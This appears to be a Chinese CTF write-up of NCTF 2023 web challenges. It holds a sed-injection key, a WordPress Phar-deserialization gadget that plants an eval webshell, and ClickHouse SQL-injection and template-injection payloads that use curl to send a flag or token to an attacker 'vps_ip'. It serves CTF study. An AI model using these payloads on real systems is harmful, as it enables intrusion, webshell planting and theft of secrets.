+<span class="hljs-keyword">if</span> (@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;method&#x27;</span>] &amp;&amp; @<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key&#x27;</span>] &amp;&amp; @<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]) &#123;
+    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;language&#x27;</span>] !== <span class="hljs-string">&#x27;PHP&#x27;</span>) &#123;
+        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;PHP是最好的语言&quot;</span>);
+    &#125;
+    <span class="hljs-variable">$method</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;method&#x27;</span>];
+    <span class="hljs-variable">$key</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key&#x27;</span>];
+    <span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;METHOD=<span class="hljs-subst">$method</span>&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你的method太复杂了！&quot;</span>);
+    <span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;KEY=<span class="hljs-subst">$key</span>&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你的key太复杂了！&quot;</span>);
+    <span class="hljs-variable">$status_code</span> = -<span class="hljs-number">1</span>;
+    <span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&quot;sh generate.sh&quot;</span>);
+    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$filename</span>) &#123;
+        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;生成失败了！&quot;</span>);
+    &#125;
+    <span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$filename</span>);
+    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: download.php?file=<span class="hljs-subst">$filename</span>&amp;filename=<span class="hljs-subst">&#123;$_POST[&#x27;filename&#x27;]&#125;</span>&quot;</span>);
+    <span class="hljs-keyword">exit</span>();
+&#125;
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+
+<div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-comment">//download.php  能够下载文件</span>
+
+<span class="hljs-meta">&lt;?php</span>
+
+<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]))&#123;
+    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];
+    <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];
+    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-type: application/octet-stream&quot;</span>);
+    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Disposition: attachment; filename=<span class="hljs-subst">$filename</span>&quot;</span>);
+    <span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$file</span>);
+    <span class="hljs-keyword">exit</span>();
+&#125;</code></pre></div>
+
+<div class="code-wrapper"><pre><code class="hljs bash">generate.sh    
+
+<span class="hljs-comment">#!/bin/sh</span>
+
+<span class="hljs-built_in">set</span> -e
+
+NEW_FILENAME=$(<span class="hljs-built_in">tr</span> -dc a-z0-9 &lt;/dev/urandom | <span class="hljs-built_in">head</span> -c 16)
+<span class="hljs-built_in">cp</span> template.php <span class="hljs-string">&quot;/tmp/<span class="hljs-variable">$NEW_FILENAME</span>&quot;</span>
+<span class="hljs-built_in">cd</span> /tmp
+
+sed -i <span class="hljs-string">&quot;s/KEY/<span class="hljs-variable">$KEY</span>/g&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$NEW_FILENAME</span>&quot;</span>
+sed -i <span class="hljs-string">&quot;s/METHOD/<span class="hljs-variable">$METHOD</span>/g&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$NEW_FILENAME</span>&quot;</span>
+
+<span class="hljs-built_in">realpath</span> <span class="hljs-string">&quot;<span class="hljs-variable">$NEW_FILENAME</span>&quot;</span></code></pre></div>
+
+<div class="code-wrapper"><pre><code class="hljs php">template.php
+
+<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_METHOD</span>[<span class="hljs-string">&quot;KEY&quot;</span>]);</code></pre></div>
+
+
+
+<p>download.php可以任意文件读。无权限读取&#x2F;flag。</p>
+<ol>
+<li>任意文件读取index.php得知赋值环境变量后调用了<code>sh generate.sh</code>，任意文件读取（或者直接HTTP访问&#x2F;generate.sh可以下载）generate.sh得知使用<code>sed -i &quot;s/METHOD/$METHOD/g&quot;</code>替换Webshell模板中的关键字。因为使用了双引号，可以进行shell参数展开，但是不能进行shell命令注入，并且只能展开为单个参数。</li>
+<li>[查询man手册或互联网](<a target="_blank" rel="noopener" href="https://www.gnu.org/software/sed/manual/sed.html#sed-commands-list:~:text=newline">https://www.gnu.org/software/sed/manual/sed.html#sed-commands-list:~:text=newline</a> is suppressed.-,e,-command)得知，<code>GNU sed</code>可以通过<code>e</code>指令执行系统命令。闭合原先的<code>s</code>指令，执行<code>/readflag</code>，会将flag插入到输出文件的第一行。自动跳转到download.php读取即可。</li>
+</ol>
+<p>sed指令可以通过换行符分隔，[也可以通过;分隔](<a target="_blank" rel="noopener" href="https://www.gnu.org/software/sed/manual/sed.html#sed-script-overview:~:text=can">https://www.gnu.org/software/sed/manual/sed.html#sed-script-overview:~:text=can</a> be separated by semicolons (%3B))。</p>
+<p>通过F12修改页面源码或抓包软件绕过前端格式限制。</p>
+<p>exp：提交key为</p>
+<div class="code-wrapper"><pre><code class="hljs JavaScript">/g;1e /readflag;s<span class="hljs-comment">//</span></code></pre></div>
+
+<h2 id="ez-wordpress"><a href="#ez-wordpress" class="headerlink" title="ez_wordpress"></a>ez_wordpress</h2><p>这种类似实战渗透的需要进行信息收集等，没咋弄过，一般的cms都没看过，别说打较新的版本了</p>
+<p>搜到了<code>WP_HTML_Token</code>但找不到<code>poc</code>，唉，不懂咧</p>
+<p><code>wpscan</code>专门用来进行<code>wordpress</code>信息收集，出题人给出了扫描结果（太多人扫描,服务器不行）</p>
+<p>前一段时间的DASCTF X 0psu3 也有一道wordpress，后来再看</p>
+<div class="code-wrapper"><pre><code class="hljs gherkin">➜ ~ wpscan --url <span class="hljs-string">&quot;http://120.27.148.152:8012/&quot;</span>
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|<span class="hljs-string"></span>
+<span class="hljs-string">          \ \  /\  / /</span>|<span class="hljs-string"> </span>|<span class="hljs-string">__) </span>|<span class="hljs-string"> (___   ___  __ _ _ __ ®</span>
+<span class="hljs-string">           \ \/  \/ / </span>|<span class="hljs-string">  ___/ \___ \ / __</span>|<span class="hljs-string">/ _` </span>|<span class="hljs-string"> &#x27;_ \</span>
+<span class="hljs-string">            \  /\  /  </span>|<span class="hljs-string"> </span>|<span class="hljs-string">     ____) </span>|<span class="hljs-string"> (__</span>|<span class="hljs-string"> (_</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|
+             \/  \/   |<span class="hljs-string">_</span>|<span class="hljs-string">    </span>|<span class="hljs-string">_____/ \___</span>|<span class="hljs-string">\__,_</span>|<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_</span>|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.25
+       Sponsored by Automattic - https://automattic.com/
+       <span class="hljs-meta">@_WPScan_,</span> <span class="hljs-meta">@ethicalhack3r,</span> <span class="hljs-meta">@erwan_lr,</span> <span class="hljs-meta">@firefart</span>
+_______________________________________________________________
+
+[+] URL: http://120.27.148.152:8012/ [120.27.148.152]
+[+] Started: Sat Dec 23 17:24:31 2023
+
+Interesting Finding(s):
+
+[+] Headers
+ |<span class="hljs-string"> Interesting Entries:</span>
+<span class="hljs-string"> </span>|<span class="hljs-string">  - Server: Apache/2.4.51 (Debian)</span>
+<span class="hljs-string"> </span>|<span class="hljs-string">  - X-Powered-By: PHP/7.4.27</span>
+<span class="hljs-string"> </span>|<span class="hljs-string"> Found By: Headers (Passive Detection)</span>
+<span class="hljs-string"> </span>|<span class="hljs-string"> Confidence: 100%</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">[+] XML-RPC seems to be enabled: http://120.27.148.152:8012/xmlrpc.php</span>
+<span class="hljs-string"> </span>|<span class="hljs-string"> Found By: Direct Access (Aggressive Detection)</span>
+<span class="hljs-string"> </span>|<span class="hljs-string"> Confidence: 100%</span>
+<span class="hljs-string"> </span>|<span class="hljs-string"> References:</span>
+<span class="hljs-string"> </span>|<span class="hljs-string">  - http://codex.wordpress.org/XML-RPC_Pingback_API</span>
+<span class="hljs-string"> </span>|<span class="hljs-string">  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/</span>
+<span class="hljs-string"> </span>|<span class="hljs-string">  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/</span>
+<span class="hljs-string"> </span>|<span class="hljs-string">  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/</span>
+<span class="hljs-string"> </span>|<span class="hljs-string">  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">[+] WordPress readme found: http://120.27.148.152:8012/readme.html</span>
+<span class="hljs-string"> </span>|<span class="hljs-string"> Found By: Direct Access (Aggressive Detection)</span>
+<span class="hljs-string"> </span>|<span class="hljs-string"> Confidence: 100%</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">[+] The external WP-Cron seems to be enabled: http://120.27.148.152:8012/wp-cron.php</span>
+<span class="hljs-string"> </span>|<span class="hljs-string"> Found By: Direct Access (Aggressive Detection)</span>
+<span class="hljs-string"> </span>|<span class="hljs-string"> Confidence: 60%</span>
+<span class="hljs-string"> </span>|<span class="hljs-string"> References:</span>
+<span class="hljs-string"> </span>|<span class="hljs-string">  - https://www.iplocation.net/defend-wordpress-from-ddos</span>
+<span class="hljs-string"> </span>|<span class="hljs-string">  - https://github.com/wpscanteam/wpscan/issues/1299</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">[+] WordPress version 6.4.1 identified (Insecure, released on 2023-11-09).</span>
+<span class="hljs-string"> </span>|<span class="hljs-string"> Found By: Emoji Settings (Passive Detection)</span>
+<span class="hljs-string"> </span>|<span class="hljs-string">  - http://120.27.148.152:8012/, Match: &#x27;wp-includes\/js\/wp-emoji-release.min.js?ver=6.4.1&#x27;</span>
+<span class="hljs-string"> </span>|<span class="hljs-string"> Confirmed By: Meta Generator (Passive Detection)</span>
+<span class="hljs-string"> </span>|<span class="hljs-string">  - http://120.27.148.152:8012/, Match: &#x27;WordPress 6.4.1&#x27;</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">[+] WordPress theme in use: twentytwentyfour</span>
+<span class="hljs-string"> </span>|<span class="hljs-string"> Location: http://120.27.148.152:8012/wp-content/themes/twentytwentyfour/</span>
+<span class="hljs-string"> </span>|<span class="hljs-string"> Readme: http://120.27.148.152:8012/wp-content/themes/twentytwentyfour/readme.txt</span>
+<span class="hljs-string"> </span>|<span class="hljs-string"> Style URL: http://120.27.148.152:8012/wp-content/themes/twentytwentyfour/style.css</span>
+<span class="hljs-string"> </span>|
+ |<span class="hljs-string"> Found By: Urls In Homepage (Passive Detection)</span>
+<span class="hljs-string"> </span>|
+ |<span class="hljs-string"> The version could not be determined.</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">[+] Enumerating All Plugins (via Passive Methods)</span>
+<span class="hljs-string">[+] Checking Plugin Versions (via Passive and Aggressive Methods)</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">[i] Plugin(s) Identified:</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">[+] all-in-one-video-gallery</span>
+<span class="hljs-string"> </span>|<span class="hljs-string"> Location: http://120.27.148.152:8012/wp-content/plugins/all-in-one-video-gallery/</span>
+<span class="hljs-string"> </span>|<span class="hljs-string"> Last Updated: 2023-09-01T08:47:00.000Z</span>
+<span class="hljs-string"> </span>|<span class="hljs-string"> [!] The version is out of date, the latest version is 3.5.2</span>
+<span class="hljs-string"> </span>|
+ |<span class="hljs-string"> Found By: Urls In Homepage (Passive Detection)</span>
+<span class="hljs-string"> </span>|
+ |<span class="hljs-string"> Version: 2.6.0 (80% confidence)</span>
+<span class="hljs-string"> </span>|<span class="hljs-string"> Found By: Readme - Stable Tag (Aggressive Detection)</span>
+<span class="hljs-string"> </span>|<span class="hljs-string">  - http://120.27.148.152:8012/wp-content/plugins/all-in-one-video-gallery/README.txt</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">[+] contact-form-7</span>
+<span class="hljs-string"> </span>|<span class="hljs-string"> Location: http://120.27.148.152:8012/wp-content/plugins/contact-form-7/</span>
+<span class="hljs-string"> </span>|<span class="hljs-string"> Last Updated: 2023-12-19T04:49:00.000Z</span>
+<span class="hljs-string"> </span>|<span class="hljs-string"> [!] The version is out of date, the latest version is 5.8.5</span>
+<span class="hljs-string"> </span>|
+ |<span class="hljs-string"> Found By: Urls In Homepage (Passive Detection)</span>
+<span class="hljs-string"> </span>|
+ |<span class="hljs-string"> Version: 5.8.4 (90% confidence)</span>
+<span class="hljs-string"> </span>|<span class="hljs-string"> Found By: Query Parameter (Passive Detection)</span>
+<span class="hljs-string"> </span>|<span class="hljs-string">  - http://120.27.148.152:8012/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.8.4</span>
+<span class="hljs-string"> </span>|<span class="hljs-string"> Confirmed By: Readme - Stable Tag (Aggressive Detection)</span>
+<span class="hljs-string"> </span>|<span class="hljs-string">  - http://120.27.148.152:8012/wp-content/plugins/contact-form-7/readme.txt</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">[+] drag-and-drop-multiple-file-upload-contact-form-7</span>
+<span class="hljs-string"> </span>|<span class="hljs-string"> Location: http://120.27.148.152:8012/wp-content/plugins/drag-and-drop-multiple-file-upload-contact-form-7/</span>
+<span class="hljs-string"> </span>|<span class="hljs-string"> Last Updated: 2023-12-05T07:37:00.000Z</span>
+<span class="hljs-string"> </span>|<span class="hljs-string"> [!] The version is out of date, the latest version is 1.3.7.4</span>
+<span class="hljs-string"> </span>|
+ |<span class="hljs-string"> Found By: Urls In Homepage (Passive Detection)</span>
+<span class="hljs-string"> </span>|
+ |<span class="hljs-string"> Version: 1.3.6.2 (80% confidence)</span>
+<span class="hljs-string"> </span>|<span class="hljs-string"> Found By: Readme - Stable Tag (Aggressive Detection)</span>
+<span class="hljs-string"> </span>|<span class="hljs-string">  - http://120.27.148.152:8012/wp-content/plugins/drag-and-drop-multiple-file-upload-contact-form-7/readme.txt</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">[+] Enumerating Config Backups (via Passive and Aggressive Methods)</span>
+<span class="hljs-string"> Checking Config Backups - Time: 00:00:01 &lt;=======================================================================================&gt; (137 / 137) 100.00% Time: 00:00:01</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">[i] No Config Backups Found.</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">[!] No WPScan API Token given, as a result vulnerability data has not been output.</span>
+<span class="hljs-string">[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">[+] Finished: Sat Dec 23 17:24:38 2023</span>
+<span class="hljs-string">[+] Requests Done: 174</span>
+<span class="hljs-string">[+] Cached Requests: 5</span>
+<span class="hljs-string">[+] Data Sent: 51.165 KB</span>
+<span class="hljs-string">[+] Data Received: 286.203 KB</span>
+<span class="hljs-string">[+] Memory used: 313.406 MB</span>
+<span class="hljs-string">[+] Elapsed time: 00:00:06</span></code></pre></div>
+
+<p>因为 WordPress 自身几乎很少出现过高危漏洞, 所以实战中针对 WordPress 站点的渗透一般都是<strong>第三方主题和插件</strong>, 于是就找了几个有意思的插件, 配合第二条链的 Phar 反序列化<strong>组合利用</strong>实现 RCE</p>
+<p>WordPress 版本 6.4.1     存在pop链</p>
+<p>Drag and Drop Multiple File Upload 插件, 版本 1.3.6.2, 存在存储型 XSS, <strong>本质是可以未授权上传图片</strong></p>
+<p>All-in-One Video Gallery Plugin 插件, 版本 2.6.0, 存在未授权任意文件下载 &#x2F; SSRF      CVE-2022-2633</p>
+<p>上传图片 -&gt; 上传 Phar -&gt; 任意文件下载 &#x2F; SSRF -&gt; 触发 Phar 反序列化</p>
+<div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-keyword">namespace</span> 
+&#123;
+    <span class="hljs-title class_">class</span> <span class="hljs-title class_">WP_HTML_Token</span> 
+    &#123;
+        <span class="hljs-title class_">public</span> $<span class="hljs-title class_">bookmark_name</span>;
+        <span class="hljs-keyword">public</span> <span class="hljs-variable">$on_destroy</span>;
+        
+        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$bookmark_name</span>, <span class="hljs-variable">$on_destroy</span></span>) </span>
+<span class="hljs-function">        </span>&#123;
+            <span class="hljs-variable language_">$this</span>-&gt;bookmark_name = <span class="hljs-variable">$bookmark_name</span>;
+            <span class="hljs-variable language_">$this</span>-&gt;on_destroy = <span class="hljs-variable">$on_destroy</span>;
+        &#125;
+    &#125;
+
+    <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WP_HTML_Token</span>(<span class="hljs-string">&#x27;echo \&#x27;&lt;?=eval($_POST[1]);?&gt;\&#x27; &gt; /var/www/html/shell.php&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>);
+
+    <span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>); 
+    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();
+    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;GIF89A&lt;?php XXX __HALT_COMPILER(); ?&gt;&quot;</span>);
+    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>);
+    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);
+    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();
+&#125;
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+
+<p>自己写个上传文件的点</p>
+<div class="code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/wp-admin/admin-ajax.php</span> <span class="hljs-meta">HTTP/1.1</span>
+<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>124.71.184.68:8012
+<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>870
+<span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0
+<span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1
+<span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://124.71.184.68:8012
+<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryf1M94EpsxN3xWdZQ
+<span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.127 Safari/537.36
+<span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+<span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://124.71.184.68:8012/wp-admin/admin-ajax.php
+<span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate
+<span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9
+<span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>aiovg_rand_seed=901849345
+<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close
+
+<span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryf1M94EpsxN3xWdZQ</span></span>
+<span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;upload-file&quot;; filename=&quot;test.jpg&quot;</span>
+<span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: image/jpeg</span>
+<span class="language-pgsql"></span>
+<span class="language-pgsql">phar.phar的文件内容</span>
+<span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryf1M94EpsxN3xWdZQ</span></span>
+<span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;size_limit&quot;</span>
+<span class="language-pgsql"></span>
+<span class="language-pgsql"><span class="hljs-number">10485760</span></span>
+<span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryf1M94EpsxN3xWdZQ</span></span>
+<span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;action&quot;</span>
+<span class="language-pgsql"></span>
+<span class="language-pgsql">dnd_codedropz_upload</span>
+<span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryf1M94EpsxN3xWdZQ</span></span>
+<span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;type&quot;</span>
+<span class="language-pgsql"></span>
+<span class="language-pgsql">click</span>
+<span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryf1M94EpsxN3xWdZQ--</span></span></code></pre></div>
+
+<div class="code-wrapper"><pre><code class="hljs awk">
+
+
+访问<span class="hljs-regexp">/index.php/</span>video/?dl=cGhhcjovLy92YXIvd3d3L2h0bWwvd3AtY29udGVudC91cGxvYWRzL3dwX2RuZGNmN191cGxvYWRzL3dwY2Y3LWZpbGVzL3Rlc3QuanBnL3Rlc3QudHh0
+
+
+<span class="hljs-regexp">//</span>base64解码后的内容是
+<span class="hljs-regexp">//</span>phar:<span class="hljs-regexp">//</span><span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>wp-content<span class="hljs-regexp">/uploads/</span>wp_dndcf7_uploads<span class="hljs-regexp">/wpcf7-files/</span>test.jpg/test.txt
+<span class="hljs-regexp">//</span>一定要带上test.txt</code></pre></div>
+
+<p>就成功写入木马</p>
+<p>连上webshell，没有权限读取flag，suid提权</p>
+<p><img src="/../images/NCTF2023/image-20231229001555068.png" srcset="/img/loading.gif" lazyload alt="image-20231229001555068"></p>
+<h2 id="house-of-click"><a href="#house-of-click" class="headerlink" title="house of click"></a>house of click</h2><p>看官方WP吧，我就复现一下，链接放在最后</p>
+<p>Clickhouse数据库</p>
+<p>nginx + gunicorn 路径绕过</p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/yDIMgXltVLNfslVGg9lt4g">https://mp.weixin.qq.com/s/yDIMgXltVLNfslVGg9lt4g</a></p>
+<p>有个查询url的用法</p>
+<p><a target="_blank" rel="noopener" href="https://clickhouse.com/docs/en/sql-reference/table-functions/url">https://clickhouse.com/docs/en/sql-reference/table-functions/url</a></p>
+<div class="code-wrapper"><pre><code class="hljs vhdl"><span class="hljs-keyword">select</span> * from url(<span class="hljs-symbol">&#x27;http</span>://ip:<span class="hljs-keyword">port</span>/&#x27;,<span class="hljs-symbol">&#x27;TabSeparatedRaw</span>&#x27;,<span class="hljs-symbol">&#x27;x</span> <span class="hljs-built_in">String</span>&#x27;))
+<span class="hljs-keyword">select</span> * from url(<span class="hljs-symbol">&#x27;http</span>://ip:<span class="hljs-keyword">port</span>/&#x27;,CSV,<span class="hljs-symbol">&#x27;a</span> <span class="hljs-built_in">String</span>&#x27;))</code></pre></div>
+
+<div class="code-wrapper"><pre><code class="hljs SQL">POST <span class="hljs-operator">/</span>query	HTTP<span class="hljs-operator">/</span><span class="hljs-number">1.1</span><span class="hljs-operator">/</span>..<span class="hljs-operator">/</span>..<span class="hljs-operator">/</span>api<span class="hljs-operator">/</span>ping HTTP<span class="hljs-operator">/</span><span class="hljs-number">1.1</span>      <span class="hljs-operator">/</span><span class="hljs-operator">/</span>(query后面有制表符)
+Host: <span class="hljs-number">124.71</span><span class="hljs-number">.184</span><span class="hljs-number">.68</span>:<span class="hljs-number">8013</span>
+Connection: <span class="hljs-keyword">close</span>
+Content<span class="hljs-operator">-</span>Type: application<span class="hljs-operator">/</span>x<span class="hljs-operator">-</span>www<span class="hljs-operator">-</span>form<span class="hljs-operator">-</span>urlencoded
+Content<span class="hljs-operator">-</span>Length: <span class="hljs-number">187</span>
+
+id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> url(<span class="hljs-string">&#x27;http://vps_ip:port/?a=&#x27;</span><span class="hljs-operator">||</span>hex((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> url(<span class="hljs-string">&#x27;http://backend:8001/api/token&#x27;</span>, <span class="hljs-string">&#x27;TabSeparatedRaw&#x27;</span>, <span class="hljs-string">&#x27;x String&#x27;</span>))), <span class="hljs-string">&#x27;TabSeparatedRaw&#x27;</span>, <span class="hljs-string">&#x27;x String&#x27;</span>));
+
+
+</code></pre></div>
+
+<p><img src="/../images/NCTF2023/image-20231230023835206.png" srcset="/img/loading.gif" lazyload alt="image-20231230023835206"></p>
+<p>记得hex解码</p>
+<div class="code-wrapper"><pre><code class="hljs oxygene">-- ssti <span class="hljs-keyword">to</span> rce
+
+INSERT <span class="hljs-keyword">INTO</span> <span class="hljs-keyword">FUNCTION</span> <span class="hljs-title function_">url</span><span class="hljs-params">(<span class="hljs-string">&#x27;http://backend:8001/api/upload&#x27;</span>, <span class="hljs-string">&#x27;TabSeparatedRaw&#x27;</span>, <span class="hljs-string">&#x27;x String&#x27;</span>, headers(<span class="hljs-string">&#x27;Content-Type&#x27;</span>=<span class="hljs-string">&#x27;multipart/form-data; boundary=----test&#x27;</span>, <span class="hljs-string">&#x27;X-Access-Token&#x27;</span>=<span class="hljs-string">&#x27;06a181b5474d020c2237cea4335ee6fd&#x27;</span>)</span>) <span class="hljs-title function_">VALUES</span> <span class="hljs-params">(<span class="hljs-string">&#x27;------test\r\nContent-Disposition: form-data; name=&quot;myfile&quot;; filename=&quot;../templates/test.html&quot;\r\nContent-Type: text/plain\r\n\r\n$code:\r\n    __import__(\&#x27;</span>os\<span class="hljs-string">&#x27;).system(\&#x27;</span>curl http://vps_ip:port/?flag=`/readflag | base64`\<span class="hljs-string">&#x27;)\r\n------test--&#x27;</span>)</span>;</code></pre></div>
+
+<p>有几个细节</p>
+<p>CSV方式上传文件是被双引号包裹</p>
+<p><img src="/../images/NCTF2023/image-20231230022919705.png" srcset="/img/loading.gif" lazyload alt="image-20231230022919705"></p>
+<p>第二</p>
+<div class="code-wrapper"><pre><code class="hljs autoit">$code:\r\n    __import__(\<span class="hljs-string">&#x27;os\&#x27;</span>)</code></pre></div>
+
+<p>换行和<code>__import__</code>之间有<strong>制表符</strong></p>
+<p><a target="_blank" rel="noopener" href="https://webpy.org/docs/0.3/templetor.zh-cn">https://webpy.org/docs/0.3/templetor.zh-cn</a></p>
+<div class="code-wrapper"><pre><code class="hljs HTML">$code:
+    __import__(&#x27;os&#x27;).system(&#x27;curl http://vps_ip:port/?flag=`/readflag | base64`&#x27;)</code></pre></div>
+
+<p>第三</p>
+<p>题目中我们select中不能使用insert语句。这里又涉及到clickhouse的http interface，我们可以通过请求<code>http://default:default@db:8123/?query=&lt;SQL&gt; </code>执行任意SQL语句</p>
+<p>把payload二次URL编码放入<code>&lt;SQL&gt;</code>的位置即可</p>
+<div class="code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/query	HTTP/1.1/../../api/ping</span> <span class="hljs-meta">HTTP/1.1</span>
+<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>124.71.184.68:8013
+<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close
+<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded
+
+<span class="language-llvm"></span>
